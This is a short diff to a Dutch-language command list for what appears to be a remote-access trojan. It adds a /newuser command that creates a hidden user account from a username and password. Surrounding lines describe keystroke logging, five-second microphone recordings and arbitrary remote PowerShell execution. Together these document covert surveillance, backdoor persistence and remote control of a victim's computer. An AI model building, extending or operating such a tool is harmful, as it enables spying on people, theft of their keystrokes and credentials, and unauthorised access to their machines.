@@ -39,6 +39,14 @@ luister naar keyboard toetsen totdat de gebruiker enter klikt
 /listen
 maak een 5 seconde geluidsopname
 
+/newuser
+maak een een nieuwe user account aan
+eerste argument is username
+tweede argument is de password
+voorbeeld:
+/newuser User02 password123
+> username en password mogen geen spaties hebben
+
 /cc
 run een custom powershell command. type de command zo uit:
 /cc + `jou command`
